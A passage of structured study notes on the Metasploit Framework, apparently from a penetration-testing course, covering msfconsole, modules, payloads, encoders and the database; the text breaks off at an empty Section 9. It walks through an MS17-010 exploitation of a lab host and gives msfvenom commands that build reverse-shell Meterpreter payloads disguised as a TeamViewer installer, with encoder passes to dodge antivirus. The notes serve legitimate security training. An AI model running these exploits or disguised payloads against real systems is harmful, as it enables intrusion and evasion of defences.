# Using the Metasploit Framework — Structured Notes

## Table of Contents
- [Section 1: Preface](#section-1-preface)
  - [1.1 Discipline](#11-discipline)
  - [1.2 Conclusion](#12-conclusion)
- [Section 2: Introduction to Metasploit](#section-2-introduction-to-metasploit)
  - [2.1 Metasploit Pro](#21-metasploit-pro)
  - [2.2 Metasploit Framework Console](#22-metasploit-framework-console)
  - [2.3 Understanding the Architecture](#23-understanding-the-architecture)
- [Section 3: Introduction to MSFconsole](#section-3-introduction-to-msfconsole)
  - [3.1 Preparation (Launching & Installing)](#31-preparation-launching--installing)
  - [3.2 MSF Engagement Structure](#32-msf-engagement-structure)
- [Section 4: Modules](#section-4-modules)
  - [4.1 Module Naming (No., Type, OS, Service, Name)](#41-module-naming-no-type-os-service-name)
  - [4.2 Searching for Modules](#42-searching-for-modules)
  - [4.3 Module Selection](#43-module-selection)
  - [4.4 Using Modules](#44-using-modules)
- [Section 5: Targets](#section-5-targets)
  - [5.1 Selecting a Target](#51-selecting-a-target)
  - [5.2 Target Types](#52-target-types)
- [Section 6: Payloads](#section-6-payloads)
  - [6.1 Singles](#61-singles)
  - [6.2 Stagers](#62-stagers)
  - [6.3 Stages](#63-stages)
  - [6.4 Staged Payloads](#64-staged-payloads)
  - [6.5 Meterpreter Payload](#65-meterpreter-payload)
  - [6.6 Searching for Payloads](#66-searching-for-payloads)
  - [6.7 Selecting Payloads](#67-selecting-payloads)
  - [6.8 Using Payloads](#68-using-payloads)
  - [6.9 Payload Types](#69-payload-types)
- [Section 7: Encoders](#section-7-encoders)
  - [7.1 Selecting an Encoder](#71-selecting-an-encoder)
- [Section 8: Databases](#section-8-databases)
  - [8.1 Setting up the Database](#81-setting-up-the-database)
  - [8.2 Using the Database (Workspaces)](#82-using-the-database-workspaces)
  - [8.3 Importing Scan Results](#83-importing-scan-results)
  - [8.4 Using Nmap Inside MSFconsole](#84-using-nmap-inside-msfconsole)
  - [8.5 Data Backup](#85-data-backup)
  - [8.6 Hosts](#86-hosts)
  - [8.7 Services](#87-services)
  - [8.8 Credentials](#88-credentials)
  - [8.9 Loot](#89-loot)
- [Section 9: Plugins](#section-9-plugins)
  - [9.1 Using Plugins](#91-using-plugins)
  - [9.2 Installing New Plugins](#92-installing-new-plugins)
  - [9.3 Mixins](#93-mixins)
- [Section 10: Sessions](#section-10-sessions)
  - [10.1 Using Sessions](#101-using-sessions)
  - [10.2 Jobs](#102-jobs)
- [Section 11: Meterpreter](#section-11-meterpreter)
  - [11.1 Running Meterpreter](#111-running-meterpreter)
  - [11.2 Stealthy](#112-stealthy)
  - [11.3 Powerful](#113-powerful)
  - [11.4 Extensible](#114-extensible)
  - [11.5 Using Meterpreter](#115-using-meterpreter)
- [Section 12: Writing and Importing Modules](#section-12-writing-and-importing-modules)
  - [12.1 Porting Over Scripts into Metasploit Modules](#121-porting-over-scripts-into-metasploit-modules)
  - [12.2 Writing Our Module](#122-writing-our-module)
- [Section 13: Introduction to MSFVenom](#section-13-introduction-to-msfvenom)
  - [13.1 Creating Our Payloads](#131-creating-our-payloads)
  - [13.2 Executing the Payload](#132-executing-the-payload)
  - [13.3 Local Exploit Suggester](#133-local-exploit-suggester)
- [Section 14: Firewall and IDS/IPS Evasion](#section-14-firewall-and-idsips-evasion)
  - [14.1 Endpoint Protection](#141-endpoint-protection)
  - [14.2 Perimeter Protection](#142-perimeter-protection)
  - [14.3 Security Policies](#143-security-policies)
  - [14.4 Evasion Techniques](#144-evasion-techniques)
  - [14.5 Archives](#145-archives)
  - [14.6 Packers](#146-packers)
  - [14.7 Exploit Coding](#147-exploit-coding)
  - [14.8 A Note on Evasion](#148-a-note-on-evasion)
- [Section 15: Metasploit-Framework Updates - August 2020](#section-15-metasploit-framework-updates---august-2020)
  - [15.1 Generation Features](#151-generation-features)
  - [15.2 Expanded Encryption](#152-expanded-encryption)
  - [15.3 Cleaner Payload Artifacts](#153-cleaner-payload-artifacts)
  - [15.4 Plugins](#154-plugins)
  - [15.5 Payloads](#155-payloads)
  - [15.6 Closing Thoughts](#156-closing-thoughts)
- [Cheatsheet](#cheatsheet)

---

## Section 1: Preface

This section frames the module's philosophy toward automated tools like Metasploit. The security industry has an ongoing debate: some argue automated tools make testing "too easy" and rob the tester of a chance to prove manual skill, while others — particularly newcomers — argue tools help people learn faster and save time for more complex work. The module adopts the latter, pro-tool stance, while being honest about the real risks tools carry.

Tools can create problems if used carelessly:
- They create a comfort zone that's hard to break out of to learn new skills.
- Publicly available tools create a security risk since anyone can access and misuse them.
- They can cause tunnel vision — "if the tool can't do it, neither can I."

The chapter also notes that the growing public release of automated security tools (e.g., the NSA's tool leaks) lowers the barrier for less-skilled malicious actors to cause harm, which is a side effect of democratizing these capabilities.

### 1.1 Discipline
This subsection argues that professional discipline matters more than technical bravado in real-world assessments. Because the pace of new technologies, protocols, and systems is accelerating, testers will never have enough time to do a fully exhaustive assessment — time must be prioritized toward the highest-impact issues first, since clients are paying for efficient results, not academic completeness. Credibility with a client is not won by manually exploiting everything instead of using a tool; clients care about outcomes, not how "impressive" the method was. Ultimately, the message is that a tester should aim to satisfy their own standards of competence rather than seek validation from the broader infosec community, since real skill validates itself over time.

### 1.2 Conclusion
The closing message stresses that testers must deeply understand their tools — their behavior, limitations, and potential for leaving traces — to avoid accidental damage, data exposure, or legal trouble during an assessment. The advice is to treat tools as an aid, not a crutch or "life support" for the entire engagement, and to actively study technical documentation for every tool used. When tools are properly understood and incorporated into a solid methodology, they save time that can instead be reinvested into deeper research and a broader, more abstract understanding of security — which is how a tester grows professionally over time.

---

## Section 2: Introduction to Metasploit

The **Metasploit Project** is a Ruby-based, modular penetration testing platform used to write, test, and execute exploit code — either custom-built or pulled from its built-in database of already-developed, modularized exploits. It bundles tools for testing vulnerabilities, enumerating networks, executing attacks, and evading detection into one environment. The module describes Metasploit as a "swiss army knife" rather than a universal solution: it's strongest at quickly getting a foothold on common, unpatched vulnerabilities by pairing a known exploit with a payload that grants access, and then helps manage multiple compromised systems during post-exploitation.

### 2.1 Metasploit Pro
Metasploit is split into two editions. **Metasploit Framework** is free, open-source, and community-driven; **Metasploit Pro** is commercial and enterprise-oriented, adding features such as Task Chains, Social Engineering tools, Vulnerability Validations, a GUI, Quick Start Wizards, and Nexpose Integration. Pro also includes its own console for command-line users who still want the extra features. Broadly, Pro's capabilities fall into three categories: **Infiltrate** (manual exploitation, AV/IPS evasion, proxy pivot, post-exploitation, credential reuse, social engineering, payload generation, VPN pivoting, phishing, web app testing, persistent sessions), **Collect Data** (import/scan data, discovery scans, meta-modules, Nexpose scan integration), and **Remediate** (brute-force, task chains, exploitation workflow, session management, reporting, team collaboration, and more).

### 2.2 Metasploit Framework Console
**msfconsole** is the most popular interface to the Metasploit Framework, offering an "all-in-one" centralized console with efficient access to virtually all MSF functionality. While it can look intimidating initially, learning its command syntax unlocks its real power. Key features include:
- It's the only fully supported way to access most Framework features.
- A console-based interface to the whole Framework.
- The most feature-complete and stable MSF interface.
- Full readline support, tab completion, and command history.
- Ability to execute external OS commands directly from within msfconsole.

Both Framework and Pro ship with an extensive module database, and combined with external tools (scanners, social engineering kits, payload generators), they let a tester manage many simultaneous vulnerabilities/sessions much like browser tabs — making usability and user experience central to effective learning.

### 2.3 Understanding the Architecture
Before using any tool deeply, it's good practice to understand its underlying file structure, both to improve testing insight and to avoid accidentally exposing yourself or a client to risk. On ParrotOS, all Metasploit base files live under `/usr/share/metasploit-framework`.

**Command explained:**
```shellsession
ls /usr/share/metasploit-framework/modules
```
- `ls` — lists directory contents.
- `/usr/share/metasploit-framework/modules` — the path containing all Metasploit modules, split into subfolders: `auxiliary`, `encoders`, `evasion`, `exploits`, `nops`, `payloads`, `post`.

**Key subdirectories:**
- **Data, Documentation, Lib** — `Data`/`Lib` are functional parts powering msfconsole; `Documentation` holds technical project details.
- **Modules** — split into categories (auxiliary, encoders, evasion, exploits, nops, payloads, post), covered in detail later.
- **Plugins** — located at `/usr/share/metasploit-framework/plugins/`; third-party add-ons that extend msfconsole functionality (e.g., `nessus.rb`, `sqlmap.rb`, `openvas.rb`).
- **Scripts** — located at `/usr/share/metasploit-framework/scripts/`; contains Meterpreter scripts and other utility scripts (subfolders: `meterpreter`, `ps`, `resource`, `shell`).
- **Tools** — located at `/usr/share/metasploit-framework/tools/`; CLI utilities callable directly from msfconsole (subfolders: `context`, `dev`, `docs`, `exploit`, `hardware`, `memdump`, `modules`, `password`, `payloads`, `recon`).

Knowing these locations in advance makes it easier to import new modules, plugins, or scripts later.

---

## Section 3: Introduction to MSFconsole

This section covers the practical steps of launching msfconsole, keeping it updated, and understanding the high-level engagement workflow used throughout the rest of the module.

### 3.1 Preparation (Launching & Installing)
msfconsole comes preinstalled on security distros like Parrot Security and Kali Linux.

**Command explained:**
```shellsession
msfconsole
```
- Launches msfconsole with its full splash-art banner, showing the current version and counts of exploits/auxiliary/post modules, payloads, encoders, and evasion modules, before dropping into the `msf6 >` prompt.

```shellsession
msfconsole -q
```
- `-q` — "quiet" flag; suppresses the splash banner and goes straight to the `msf6 >` prompt. Useful for faster startup or scripting.

**Step-by-step (installing/updating Metasploit):**
1. Use the `help` command inside msfconsole to view all available commands.
2. To update modules and features, run on the OS terminal (outside msfconsole):
   ```shellsession
   sudo apt update && sudo apt install metasploit-framework
   ```
   - `apt update` — refreshes the package index.
   - `apt install metasploit-framework` — installs/updates the Metasploit package via the system package manager (replacing the older, now-deprecated `msfupdate` method).
3. Before exploitation, perform **Enumeration**: scan the target's IP to determine which services are running and their exact versions, since unpatched/outdated versions are typically the entry point for exploitation.

### 3.2 MSF Engagement Structure
The module frames the overall MSF workflow into five main categories, each with its own subcategories (e.g., Service Validation and Vulnerability Research under Enumeration; Code Auditing under Preparation; Module Execution under Exploitation; Pivoting and Data Exfiltration under Post-Exploitation):
1. **Enumeration**
2. **Preparation**
3. **Exploitation**
4. **Privilege Escalation**
5. **Post-Exploitation**

This structure is meant to make it easier to locate and apply the right MSF feature in a logical order as an engagement progresses. The module recommends exploring each category's individual components hands-on in the labs, since experimentation is a key part of learning any new tool.

---

## Section 4: Modules

Metasploit modules are pre-built, tested scripts for specific purposes. The **exploit** category specifically contains proof-of-concept (POC) code that automates exploitation of known vulnerabilities. Importantly, if an exploit module fails, that does **not** disprove the existence of the underlying vulnerability — it may just mean the module needs target-specific customization. This is why Metasploit should be treated as a support tool, not a full substitute for manual exploitation skills.

### 4.1 Module Naming (No., Type, OS, Service, Name)
Every module follows a structured naming/display convention:

**Syntax explained:**
```shellsession
<No.> <type>/<os>/<service>/<name>
```
Example: `794 exploit/windows/ftp/scriptftp_list`

- **No.** — the index number shown during a search, used to quickly select the module later instead of typing its full path.
- **Type** — the first segregation level, describing what the module category accomplishes. Types include:
  | Type | Description |
  |---|---|
  | Auxiliary | Scanning, fuzzing, sniffing, and admin capabilities; extra assistance/functionality. |
  | Encoders | Ensure payloads stay intact en route to their destination. |
  | Exploits | Modules that exploit a vulnerability to allow payload delivery. |
  | NOPs | "No Operation" code; keep payload sizes consistent across attempts. |
  | Payloads | Code that runs remotely and calls back to the attacker to establish a connection/shell. |
  | Plugins | Extra scripts integrated into msfconsole alongside an assessment. |
  | Post | Modules for post-exploitation info-gathering, pivoting, etc. |

  Only **Auxiliary**, **Exploits**, and **Post** modules can be directly loaded with `use <no.>` as interactable/initiator modules.
- **OS** — the operating system/architecture the module targets, since different OSes need different underlying code.
- **Service** — the vulnerable service targeted (for auxiliary/post modules, this may instead describe a general activity like `gather`).
- **Name** — describes the specific action the module performs.

### 4.2 Searching for Modules
Metasploit's `search` function lets you quickly filter its full module database using tags.

**Command explained:**
```shellsession
help search
```
Shows all search options and keywords, including:
- `-o <file>` — export results to CSV.
- `-S <string>` — regex filter pattern.
- `-u` — auto-use the module if only one result is returned.
- `-s <column>` — sort results ascending by a column.
- `-r` — reverse the sort order (descending).

Supported keyword filters include `cve`, `type`, `platform`, `rank`, `author`, `date`, `port`, `name`, `path`, and more; a `-` prefix before a value excludes matches.

**Step-by-step (searching for an exploit):**
1. Run a general search: `search eternalromance` — returns all modules matching that term.
2. Narrow by type: `search eternalromance type:exploit` — restricts results to exploit modules only.
3. Combine multiple filters for a precise search, e.g.:
   ```shellsession
   search type:exploit platform:windows cve:2021 rank:excellent microsoft
   ```
   This filters by module type, target platform, CVE year, exploit reliability rank, and a keyword — narrowing results to only modules matching **all** criteria simultaneously.

### 4.3 Module Selection
**Step-by-step (selecting a module for a real target):**
1. Scan the target to identify open services and versions:
   ```shellsession
   nmap -sV 10.10.10.40
   ```
   - `-sV` — enables service/version detection, revealing e.g. SMB running on a Windows 7–10 host via port 445.
2. In msfconsole, search for a matching exploit:
   ```shellsession
   search ms17_010
   ```
   Returns multiple matching modules with index numbers, ranks, and descriptions (e.g., EternalBlue, EternalRomance/Synergy/Champion variants).
3. Based on the detected OS/version, select the appropriate module by its index number for further configuration.

### 4.4 Using Modules
Once a module is selected, it exposes configurable options that must be set to match the target environment.

**Command explained:**
```shellsession
use 0
```
- Loads the module at index `0` from the last search results, saving the need to type its full path.

```shellsession
show options
```
(or simply `options`) — Displays all configurable parameters for the currently loaded module and its payload. Any option marked **Yes** under "Required" must be set before exploitation. Typical fields include `RHOSTS` (target host), `RPORT` (target port), and payload-specific fields like `LHOST`/`LPORT`.

```shellsession
info
```
- Displays detailed module metadata: name, module path, platform, architecture, privilege requirements, license, disclosure date, authors, available targets, whether a `check` method is supported, full description, and reference links (CVEs, advisories).

**Step-by-step (configuring and running a module):**
1. Load the module: `use 0` (or `use exploit/windows/smb/ms17_010_psexec`).
2. Review required options: `options`.
3. Set the target host:
   ```shellsession
   set RHOSTS 10.10.10.40
   ```
   - `set` — assigns a value to an option for the **current module only** (resets if you switch modules).
4. (Optional) Set a value permanently across module switches using `setg`:
   ```shellsession
   setg RHOSTS 10.10.10.40
   ```
   - `setg` — "set global"; the value persists for the session until msfconsole restarts or is unset.
5. Set the listener address for the reverse payload:
   ```shellsession
   setg LHOST 10.10.14.15
   ```
6. Run the exploit:
   ```shellsession
   run
   ```
   - Executes the module. On success, output shows connection details, vulnerability confirmation (e.g., "Host is likely VULNERABLE"), exploitation steps, and finally a shell session being opened.
7. Interact with the resulting shell, e.g.:
   ```shellsession
   meterpreter> shell
   C:\Windows\system32> whoami
   ```
   - `whoami` — a native Windows command confirming the compromised account's identity (e.g., `nt authority\system`, meaning full SYSTEM-level access was achieved).

---

## Section 5: Targets

**Targets** are operating-system-specific identifiers that adapt an exploit module to run correctly against a particular OS version/build.

**Command explained:**
```shellsession
show targets
```
- Run outside any loaded module, this returns an error (`[-] No exploit module selected.`) since targets are module-specific.
- Run inside a loaded exploit module, it lists all OS/version combinations the exploit supports.

### 5.1 Selecting a Target
Some exploits (like the MS17-010 example) support only one generic "Automatic" target, while others support many specific combinations — e.g., the MS12-063 Internet Explorer Use-After-Free exploit supports distinct targets like "IE 7 on Windows XP SP3" through "IE 9 on Windows 7."

**Step-by-step:**
1. Use `info` on the loaded exploit module to understand the vulnerability and read background details (always recommended as a safety/audit step before using a new module).
2. Run `options` and then `show targets` to view all supported target OS/application version combinations.
3. If the target's exact version is known, select it directly:
   ```shellsession
   set target 6
   ```
   - `set target <index no.>` — picks a specific target profile from the list (e.g., "IE 9 on Windows 7") instead of leaving it on **Automatic**, which would otherwise trigger automatic service detection before attacking.

### 5.2 Target Types
Target definitions can vary by service pack, OS version, and even language pack, because each of these can shift the memory **return address** the exploit needs to use. This return address might be a `jmp esp`, a jump to a specific register, or a `pop/pop/ret` sequence — concepts covered in more depth in the Stack-Based Buffer Overflows module. Comments inside a module's source code often clarify what determines a given target's definition.

**Step-by-step (identifying a target correctly):**
1. Obtain a copy of the target application's binaries.
2. Use `msfpescan` to locate a suitable return address within those binaries.

(Deeper exploit development, payload generation, and target identification techniques are covered later in the module.)

---

## Section 6: Payloads

A **Payload** is the module that helps an exploit return a shell/connection to the attacker. The exploit's job is to bypass the vulnerable service's normal operation; the payload's job is to run on the target OS afterward and typically establish a reverse connection and foothold. There are three payload types — **Singles**, **Stagers**, and **Stages** — and whether a payload is staged is indicated by a `/` in its name (e.g., `windows/shell_bind_tcp` is a single; `windows/shell/bind_tcp` is staged — stager `bind_tcp` + stage `shell`).

### 6.1 Singles
A **Single** payload is fully self-contained, bundling the entire shellcode needed to complete a task in one piece. They tend to be more stable than staged alternatives since everything is included, but can be too large for some exploits to support. Examples include simple actions like adding a user or starting a process — the result is immediate since nothing further needs to be downloaded.

### 6.2 Stagers
**Stagers** run on the victim machine and initiate an outbound connection to the attacker's listener, establishing the channel over which a subsequent **stage** payload will be delivered. They're designed to be small and reliable, and Metasploit automatically picks the most appropriate stager for the scenario, falling back to alternatives when needed. Windows stagers come in **NX** and **NO-NX** variants — NX stagers are larger (due to `VirtualAlloc` memory use) but handle Data Execution Prevention (DEP) more reliably; NX + Win7-compatible is now the default.

### 6.3 Stages
**Stages** are the components downloaded by a stager, enabling advanced, size-unrestricted features like Meterpreter or VNC Injection. Stages typically use a middle stager because a single `recv()` call can fail on large payloads — the initial stager receives a middle stager, which then performs the full download; this is also friendlier to RWX memory regions used by security controls.

### 6.4 Staged Payloads
A **staged payload** modularizes the exploitation process into separate functional code blocks chained together, ultimately granting remote access if all stages succeed correctly. Keeping each stage small and inconspicuous helps with Antivirus (AV) and Intrusion Prevention System (IPS) evasion. **Stage0** is the initial shellcode sent to the vulnerable service — its sole job is to initiate a reverse connection back to the attacker (common names: `reverse_tcp`, `reverse_https`, `bind_tcp`).

**Command explained:**
```shellsession
show payloads
```
- Lists all available payloads for the current context, including staged options like `windows/x64/meterpreter/bind_tcp` or `windows/x64/meterpreter/reverse_tcp` — the suffix after the final `/` names the stager/transport mechanism used.

Reverse connections are generally more effective than bind connections because they exploit the greater trust typically given to **outbound** traffic by firewalls, bypassing stricter inbound filtering. After the connection is established, Stage0 loads a larger **Stage1** payload into memory, which is what actually grants shell access.

### 6.5 Meterpreter Payload
**Meterpreter** is a multi-faceted payload using DLL injection to keep the connection stable, stealthy, and (optionally) persistent across reboots. It resides entirely in memory, leaving no disk traces, making it hard to detect with conventional forensics, and supports dynamically loading/unloading scripts and plugins. Once executed, it spawns a Meterpreter session with its own command interface (similar to msfconsole but aimed at the target), offering capabilities like keystroke capture, password hash collection, microphone access, screenshots, and process token impersonation. Plugins like Mimikatz can extend Meterpreter's capabilities further.

### 6.6 Searching for Payloads
**Step-by-step (finding a specific payload):**
1. Run `show payloads` to list the full payload catalog (hundreds of entries).
2. Use `grep` to filter results by keyword, e.g.:
   ```shellsession
   grep meterpreter show payloads
   ```
   - `grep <term> <command>` — filters the output of `<command>` to only lines containing `<term>`.
3. Chain multiple `grep` filters for a more precise match:
   ```shellsession
   grep meterpreter grep reverse_tcp show payloads
   ```
   - Each additional `grep` narrows the result set further (here: Meterpreter payloads that are also reverse TCP variants).
4. Use `grep -c` to count matches instead of listing them:
   ```shellsession
   grep -c meterpreter show payloads
   ```
   - `-c` — returns a numeric count of matching lines.

### 6.7 Selecting Payloads
**Step-by-step:**
1. With an exploit module loaded, run `show payloads` — results are automatically filtered to payloads compatible with the module's target OS/architecture.
2. Select a payload by its index:
   ```shellsession
   set payload 15
   ```
   This sets the payload (e.g., `windows/x64/meterpreter/reverse_tcp`).
3. Run `show options` again — new payload-specific fields now appear (notably `LHOST` and `LPORT` for the reverse connection).

### 6.8 Using Payloads
**Required exploit parameters:**
| Parameter | Description |
|---|---|
| RHOSTS | The target machine's IP address. |
| RPORT | Verify it's set to the correct service port (e.g., 445 for SMB). |

**Required payload parameters:**
| Parameter | Description |
|---|---|
| LHOST | The attacker's own IP address. |
| LPORT | Verify the port isn't already in use. |

**Command explained:**
```shellsession
ifconfig
```
- Run directly inside msfconsole, this calls the OS-level `ifconfig` to display the attacker's network interfaces, helping quickly confirm the correct `LHOST` value (e.g., the `tun0` VPN interface IP).

**Step-by-step:**
1. Check your IP: `ifconfig`.
2. Set payload and exploit parameters:
   ```shellsession
   set LHOST 10.10.14.15
   set RHOSTS 10.10.10.40
   ```
3. Run the exploit: `run`.
4. Once a Meterpreter session opens, note that its prompt (`meterpreter >`) is **not** a Windows shell — standard Windows commands like `whoami` won't work; use Meterpreter's own commands instead (e.g., `getuid` as the equivalent of `whoami`).
5. Explore the `help` menu to see the full Meterpreter command set (file system, networking, system, user interface, webcam, audio, privilege, and password-database commands).
6. Navigate the target's filesystem directly, e.g.:
   ```shellsession
   meterpreter > cd Users
   meterpreter > ls
   ```
7. Drop into a native Windows shell if needed:
   ```shellsession
   meterpreter > shell
   ```
   This opens Channel 1 — the actual communication channel to the compromised host's command line — while retaining the same privilege level as the Meterpreter session.

### 6.9 Payload Types
Common Windows payloads and their purposes:
| Payload | Description |
|---|---|
| generic/custom | Generic listener, multi-use. |
| generic/shell_bind_tcp | Generic listener, normal shell, binds a TCP port. |
| generic/shell_reverse_tcp | Generic listener, normal shell, reverse TCP connection. |
| windows/x64/exec | Executes an arbitrary command (x64). |
| windows/x64/loadlibrary | Loads an arbitrary x64 library path. |
| windows/x64/messagebox | Spawns a customizable dialog box. |
| windows/x64/shell_reverse_tcp | Single payload, normal shell, reverse TCP. |
| windows/x64/shell/reverse_tcp | Stager + stage, normal shell, reverse TCP. |
| windows/x64/shell/bind_ipv6_tcp | Stager + stage, IPv6 bind TCP. |
| windows/x64/meterpreter/$ | Meterpreter payload + stager/stage varieties. |
| windows/x64/powershell/$ | Interactive PowerShell sessions + varieties. |
| windows/x64/vncinject/$ | VNC Server (Reflective Injection) + varieties. |

Other notable payload ecosystems mentioned (outside this module's scope) include **Empire** and **Cobalt Strike**, plus vendor-specific payloads (Cisco, Apple, PLCs) and custom payloads built with `msfvenom` (covered later).

---

## Section 7: Encoders

**Encoders** make payloads compatible across different processor architectures (x64, x86, sparc, ppc, mips) and strip out "bad characters" (hex opcodes that could break shellcode execution). Historically they were also used for AV evasion, though this use has weakened over time as IPS/IDS vendors improved signature analysis. **Shikata Ga Nai (SGN)** was historically the most popular evasion encoder, though modern detection has largely caught up to it.

### 7.1 Selecting an Encoder
Before 2015, payload generation and encoding were separate tools: **msfpayload** (payload generation) and **msfencode** (encoding), located in `/usr/share/framework2/`.

**Command explained (legacy method):**
```shellsession
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
- `msfpayload ... R` — generates raw shellcode for the given payload and parameters.
- `|` — pipes the raw shellcode output into the next command.
- `msfencode -b '\x00'` — encodes the payload while avoiding the bad character `\x00` (null byte).
- `-f perl` — formats the output as a Perl variable.
- `-e x86/shikata_ga_nai` — applies the Shikata Ga Nai encoder.

Since 2015, these were merged into **msfvenom**, which handles both generation and encoding in one tool.

**Command explained (modern method, without encoding):**
```shellsession
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
- `-a x86` — target architecture.
- `--platform windows` — target OS platform.
- `-p <payload>` — the payload module to use.
- `LHOST`/`LPORT` — attacker listener address/port.
- `-b "\x00"` — bad characters to avoid.
- `-f perl` — output format.

**Command explained (with encoding):**
```shellsession
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
- `-e x86/shikata_ga_nai` — applies the specified encoder; comparing the output with/without `-e` shows the shellcode bytes visibly change in structure after encoding.

**Command explained (listing compatible encoders):**
```shellsession
show encoders
```
- Run inside a loaded exploit+payload combo, lists only encoders compatible with that module/payload/architecture (e.g., for an x64 target, only `x64/xor`, `x64/xor_dynamic`, `x64/zutto_dekiru`, etc. may appear).

**Step-by-step (generating and testing an encoded executable):**
1. Generate a payload executable with one encoding pass:
   ```shellsession
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
   ```
   - `-o <file>` — output file path/name.
2. Upload the resulting file to VirusTotal to check detection rates — a single-pass SGN encoding is typically still detected by a majority of AV engines.
3. Try multiple encoding iterations for comparison:
   ```shellsession
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
   ```
   - `-i 10` — applies 10 iterations of the encoder, increasing payload size/complexity each time but still generally insufficient for full AV evasion on its own.
4. (Optional) Use Metasploit's VirusTotal integration directly:
   ```shellsession
   msf-virustotal -k <API key> -f TeamViewerInstall.exe
   ```
   - `-k <API key>` — your VirusTotal API key (requires free registration).
   - `-f <file>` — the file to scan and report on.

The key takeaway is that encoding alone, even with many iterations, is rarely sufficient for modern AV evasion — other techniques (covered in Section 14) are needed.

---

## Section 8: Databases

Metasploit's database support (via **PostgreSQL**) helps track scan results, hosts, services, credentials, and loot across a complex assessment, preventing the chaos of manually tracking large amounts of data. Database entries can also directly populate exploit module parameters (e.g., auto-filling `RHOSTS` from stored host data).

### 8.1 Setting up the Database
**Step-by-step:**
1. Check PostgreSQL's status:
   ```shellsession
   sudo service postgresql status
   ```
2. Start it if needed:
   ```shellsession
   sudo systemctl start postgresql
   ```
3. Initialize the Metasploit database:
   ```shellsession
   sudo msfdb init
   ```
   - Creates the `msf` database user, the `msf` and `msf_test` databases, a config file at `/usr/share/metasploit-framework/config/database.yml`, and the initial schema. If an error occurs (e.g., a Bundler/Ruby error), try `sudo apt update` to refresh Metasploit, then retry `msfdb init`.
4. If initialization is skipped because it's already configured, check status instead:
   ```shellsession
   sudo msfdb status
   ```
5. Launch msfconsole with an automatic database connection:
   ```shellsession
   sudo msfdb run
   ```
   - Starts the database (if not already running) and launches msfconsole already connected.
6. If password/configuration issues persist, reinitialize:
   ```shellsession
   msfdb reinit
   cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
   sudo service postgresql restart
   msfconsole -q
   db_status
   ```
   - `msfdb reinit` — resets the database configuration.
   - `cp ... ~/.msf4/` — copies the fresh config into the user's local Metasploit config directory.
   - `db_status` — confirms the connection type and status (e.g., "Connected to msf. Connection type: PostgreSQL.").

**Database help commands** (`help database`) include: `db_connect`, `db_disconnect`, `db_export`, `db_import`, `db_nmap`, `db_rebuild_cache`, `db_status`, `hosts`, `loot`, `notes`, `services`, `vulns`, `workspace`.

### 8.2 Using the Database (Workspaces)
**Workspaces** function like project folders, letting you segregate scan results, hosts, and findings by IP, subnet, network, or domain.

**Command explained:**
```shellsession
workspace
```
- Lists all workspaces; the current one is marked with `*` (default is `default`).

```shellsession
workspace -a Target_1
```
- `-a <name>` — adds a new workspace named `Target_1`.

```shellsession
workspace Target_1
```
- Switches the active workspace to `Target_1`.

```shellsession
workspace -h
```
- Shows full workspace command help: `-d` deletes a workspace, `-D` deletes all, `-r` renames, `-v` lists verbosely.

### 8.3 Importing Scan Results
**Step-by-step (importing an Nmap scan):**
1. Have an Nmap scan result saved, ideally in `.xml` format (preferred by `db_import`).
2. Import it:
   ```shellsession
   db_import Target.xml
   ```
   - Parses the file (via the Nokogiri XML parser) and imports discovered hosts/services into the current workspace's database.
3. Confirm the import:
   ```shellsession
   hosts
   services
   ```
   - `hosts` — lists all stored host records (address, OS info, comments, etc.).
   - `services` — lists all stored service records (host, port, protocol, service name, state, version info).

### 8.4 Using Nmap Inside MSFconsole
**Command explained:**
```shellsession
db_nmap -sV -sS 10.10.10.8
```
- `db_nmap` — runs Nmap directly from msfconsole and **automatically records results into the connected database**, without needing a separate import step.
- `-sV` — service/version detection.
- `-sS` — TCP SYN ("stealth") scan.

After running, `hosts` and `services` immediately reflect the new scan data alongside any previously imported results.

### 8.5 Data Backup
**Command explained:**
```shellsession
db_export -f xml backup.xml
```
- `db_export` — exports the current workspace's database contents to a file.
- `-f xml` — specifies the export format (`xml` or `pwdump` are supported).
- `backup.xml` — the output filename.

This exported file can later be re-imported with `db_import` if the database is lost or needs to be transferred.

### 8.6 Hosts
The `hosts` table auto-populates with discovered host addresses, hostnames, and OS info from scans/interactions (especially useful when paired with scanner plugins like Nessus, Nexpose, or Nmap). Hosts can also be added manually.

**Command explained:**
```shellsession
hosts -h
```
Shows options including `-a` (add), `-d` (delete), `-c <cols>` (show only specified columns), `-u` (only up hosts), `-o <file>` (export CSV), `-O <col>` (order by column), `-R` (set RHOSTS from results), `-S <string>` (search filter), `-i` (edit info), `-n` (edit name), `-m` (edit comment), `-t` (tag hosts).

### 8.7 Services
The `services` table works identically to `hosts` but for discovered services, equally customizable and searchable.

**Command explained:**
```shellsession
services -h
```
Shows options including `-a`/`-d` (add/delete), `-s <name>` (service name to add), `-p <port>` (search by port list), `-r <protocol>` (tcp/udp), `-u` (only up services), `-U` (update existing service data), plus the same export/search/order flags as `hosts`.

### 8.8 Credentials
The `creds` command manages captured credentials — listing, adding, and filtering them.

**Command explained:**
```shellsession
creds add user:admin password:notpassword realm:workgroup
```
- Adds a credential record with a username, password, and authentication realm (domain/workgroup).

Other add formats support NTLM hashes, SSH keys, John the Ripper hash types, and non-replayable hashes. Filter options for listing include `-P` (password match), `-p` (port spec), `-s` (service names), `-u` (username match), `-t` (credential type), and `-O` (origin IP match). Use `-d` to delete matching credentials (e.g., `creds -d -s smb` deletes all SMB creds).

### 8.9 Loot
The `loot` command tracks captured artifacts like hash dumps (`hashes`, `passwd`, `shadow`, etc.) tied to specific hosts and types.

**Command explained:**
```shellsession
loot -h
```
Shows usage: `-a`/`--add` adds loot (with `-f` file, `-i` info, `-t` type, and target addresses), `-d`/`--delete` removes matching loot, `-t <type1,type2>` searches by type, `-S` searches by string.

---

## Section 9: Plugins

